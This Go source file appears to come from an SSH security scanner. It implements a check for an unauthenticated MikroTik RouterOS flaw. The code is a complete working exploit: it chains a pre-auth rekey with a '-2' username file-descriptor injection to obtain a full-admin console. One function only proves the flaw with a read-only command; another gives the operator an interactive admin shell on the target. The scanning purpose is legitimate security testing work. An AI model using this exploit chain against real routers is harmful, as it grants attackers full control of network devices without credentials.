package cmd

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"golang.org/x/term"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnMikrotikFD2Inject = "vuln-mikrotik-fd2-inject"

// CVE-2026-86060 (MikroTrick): the RouterOS SSH login helper parses a
// positional argv starting with '-' as '-<fd>' and reads the trusted
// (name, policy-mask) fields from that descriptor. A username of "-2" makes
// the helper read them from the PTY, letting the client inject an arbitrary
// identity with the full policy mask. Combined with the CVE-2026-67279
// pre-auth rekey (which opens the session channel without authentication),
// this yields an unauthenticated full-admin RouterOS console.
// Fixed in 7.24.2 / 7.23.4 / 6.49.21.
//
// Detection: present username "-2" with 'none' auth (rejected, but the
// username stays pending), request a rekey, open a session, request a PTY +
// shell, and write the canonical-PTY fd-2 block (name \0 policy \0 VEOF
// VEOF). Only then does the login helper spawn a RouterOS console: the
// channel open alone (CVE-2026-67279) produces no console, and the same
// injection without the pending "-2" username is ignored, so the console
// prompt is specific to CVE-2026-86060. No credentials are needed and the
// check only runs a read-only "/system resource print".
//
// https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/

// mikrotikFD2Block is the injected (name, policy) record read by the login
// helper from fd 2: "admin" \0 4294967295 \0 VEOF VEOF. The trailing VEOF
// bytes terminate canonical-mode line editing on the PTY.
var mikrotikFD2Block = []byte("admin\x004294967295\x00\x04\x04")

var (
	mikrotikFD2ANSIRe   = regexp.MustCompile("\x1b(?:\\[[0-?]*[ -/]*[@-~]|.)")
	mikrotikFD2PromptRe = regexp.MustCompile(`@[^\[\]]{0,40}\]>`)
)

// mikrotikFD2Squashed strips ANSI escapes and all whitespace from console
// output, so prompt detection still works when the console renders
// vertically (one character per line).
func mikrotikFD2Squashed(raw []byte) string {
	plain := mikrotikFD2ANSIRe.ReplaceAll(raw, nil)
	plain = bytes.ReplaceAll(plain, []byte("\r"), nil)
	return strings.Join(strings.Fields(string(plain)), "")
}

// mikrotikFD2Options builds the base auth options that perform the
// unauthenticated pre-auth rekey (CVE-2026-67279) with the rejected "-2"
// username pending (CVE-2026-86060). The caller supplies the session handler.
func mikrotikFD2Options(addr string, conf *ScanConfig, options *auth.Options) *auth.Options {
	tname := checkVulnMikrotikFD2Inject
	return options.
		WithUsername("-2").
		WithIgnoreAuthError().
		WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
			// CVE-2026-67279: enter the connection protocol unauthenticated,
			// leaving the rejected "-2" username pending for the login helper.
			if err := uac.RequestKeyExchange(); err != nil {
				conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
				return err
			}
			conf.Logger.Tracef("%s %s pre-auth rekey requested with '-2' pending", addr, tname)
			return nil
		})
}

// mikrotikFD2OpenConsole requests a pty + shell on ses, injects the fd-2
// identity block, and returns the session's stdin pipe.
func mikrotikFD2OpenConsole(ses *ssh.Session) (io.WriteCloser, error) {
	stdIn, err := ses.StdinPipe()
	if err != nil {
		return nil, err
	}
	if err := ses.RequestPty("vt100", 24, 80, ssh.TerminalModes{}); err != nil {
		return nil, err
	}
	if err := ses.Shell(); err != nil {
		return nil, err
	}
	if _, err := stdIn.Write(mikrotikFD2Block); err != nil {
		return nil, err
	}
	return stdIn, nil
}

// sshInteractVulnMikrotikFD2Inject re-establishes the unauthenticated
// CVE-2026-86060 full-admin console and drives it interactively. The RouterOS
// console is a PTY that emits DECID/CPR sizing probes and can render
// vertically; a background relay answers those probes and echoes console
// output while the foreground loop forwards each stdin line as a command.
func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikFD2Inject

	if fd := int(os.Stdin.Fd()); !term.IsTerminal(fd) {
		conf.Logger.Errorf("%s %s interact requires a controlling terminal", addr, tname)
		return nil
	}

	res := auth.SSHAuth(addr, mikrotikFD2Options(addr, conf, options).WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
		_ = c.SetDeadline(time.Time{})
		defer sclient.Close()

		stdOut := auth.NewSyncByteBuffer(1024 * 64)
		ses.Stdout = stdOut
		ses.Stderr = stdOut
		stdIn, err := mikrotikFD2OpenConsole(ses)
		if err != nil {
			return err
		}
		defer stdIn.Close()

		fmt.Printf("\r\nMikroTik RouterOS admin console via '-2' fd injection on %s\r\n", addr)
		fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")

		// Relay console output to the terminal while answering the DECID/CPR
		// probes the console uses to size itself.
		stop := make(chan struct{})
		defer close(stop)
		go func() {
			tick := time.NewTicker(time.Millisecond * 50)
			defer tick.Stop()
			emitted := 0
			cprAnswered := 0
			decidAnswered := false
			for {
				select {
				case <-stop:
					return
				case <-tick.C:
				}
				raw := stdOut.Peek()
				if len(raw) > emitted {
					_, _ = os.Stdout.Write(raw[emitted:])
					os.Stdout.Sync()
					emitted = len(raw)
				}
				if !decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
					decidAnswered = true
					_, _ = stdIn.Write([]byte("\x1b[?1;2c"))
				}
				if n := bytes.Count(raw, []byte("\x1b[6n")); cprAnswered < n {
					for cprAnswered < n {
						cprAnswered++
						if _, err := stdIn.Write([]byte("\x1b[24;80R")); err != nil {
							return
						}
					}
				}
			}
		}()

		reader := bufio.NewReader(os.Stdin)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					return nil
				}
				return err
			}
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			switch strings.ToLower(line) {
			case "exit", "quit", ".":
				return nil
			}
			if _, err := stdIn.Write([]byte(line + "\r")); err != nil {
				return err
			}
		}
	}), auth.SSHAuthHandlerSingle(ssh.None()))

	return res
}

func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikFD2Inject
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running", addr, tname)

	o := mikrotikFD2Options(addr, conf, options).
		WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
			_ = c.SetDeadline(time.Now().Add(time.Second * 25))

			stdOut := auth.NewSyncByteBuffer(1024 * 64)
			ses.Stdout = stdOut
			ses.Stderr = stdOut
			stdIn, err := mikrotikFD2OpenConsole(ses)
			if err != nil {
				return err
			}

			// Drive the console: answer DECID/CPR terminal probes (always
			// with the requested 24x80 geometry), wait for the prompt, then
			// run a read-only proof command.
			sent := false
			mark := 0
			cprAnswered := 0
			decidAnswered := false
			nagAnswered := false
			deadline := time.Now().Add(time.Second * 20)
			for time.Now().Before(deadline) {
				raw := stdOut.Peek()
				if !decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
					decidAnswered = true
					_, _ = stdIn.Write([]byte("\x1b[?1;2c"))
				}
				if n := bytes.Count(raw, []byte("\x1b[6n")); cprAnswered < n {
					for cprAnswered < n {
						cprAnswered++
						if _, err := stdIn.Write([]byte("\x1b[24;80R")); err != nil {
							return err
						}
					}
				}
				squashed := mikrotikFD2Squashed(raw)
				if !nagAnswered && strings.Contains(squashed, "[Y/n]") {
					nagAnswered = true
					_, _ = stdIn.Write([]byte("n"))
					continue
				}
				if !sent {
					if mikrotikFD2PromptRe.MatchString(squashed) {
						conf.Logger.Tracef("%s %s console prompt detected after fd-2 injection", addr, tname)
						if _, err := stdIn.Write([]byte("/system resource print\r")); err != nil {
							return err
						}
						sent = true
						mark = len(squashed)
					}
				} else if strings.Contains(squashed[mark:], "version:") {
					r.SessionOutput = auth.CleanSessionOutput(raw)
					return nil
				}
				time.Sleep(time.Millisecond * 50)
			}
			return fmt.Errorf("no RouterOS console output after fd-2 injection")
		})

	// ssh.None() is rejected as expected; IgnoreAuthError keeps the
	// connection open so the rekey + channel open follow.
	res := auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
	if res.Stage != "session" {
		conf.Logger.Debugf("%s %s did not open a session (stage %s): %v", addr, tname, res.Stage, res.Error)
		return nil
	}
	if res.SessionOutput == "" {
		// The channel opened (CVE-2026-67279 territory) but the fd-2
		// injection produced no console, so CVE-2026-86060 does not apply.
		conf.Logger.Debugf("%s %s session opened but no console appeared: %v", addr, tname, res.Error)
		return nil
	}

	// Attribute to RouterOS before naming the CVE: either the server banner
	// (SSH-2.0-ROSSSH) or the proof command output must look like RouterOS.
	if !mikrotikPreauthRekeyIsRouterOS(res.Version, res.SessionOutput) {
		conf.Logger.Warnf("%s %s console appeared after fd-2 injection, but the service (%q) does not look like RouterOS; not reporting CVE-2026-86060", addr, tname, res.Version)
		return nil
	}

	version := mikrotikParseRouterOSVersion(res.SessionOutput)
	conf.Logger.Warnf("%s %s unauthenticated full-admin console via '-2' fd injection", addr, tname)
	if version != "" {
		conf.Logger.Infof("%s %s RouterOS version: %s", addr, tname, version)
	}

	proof := fmt.Sprintf("CVE-2026-86060: unauthenticated RouterOS console via '-2' login-helper fd injection (server: %s)", res.Version)
	if version != "" {
		proof += fmt.Sprintf(". RouterOS version: %s", version)
	}

	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/",
		Proof: proof,
	})

	res.SessionMethod = tname
	root.SessionMethod = tname
	root.SessionOutput = res.SessionOutput

	return res
}
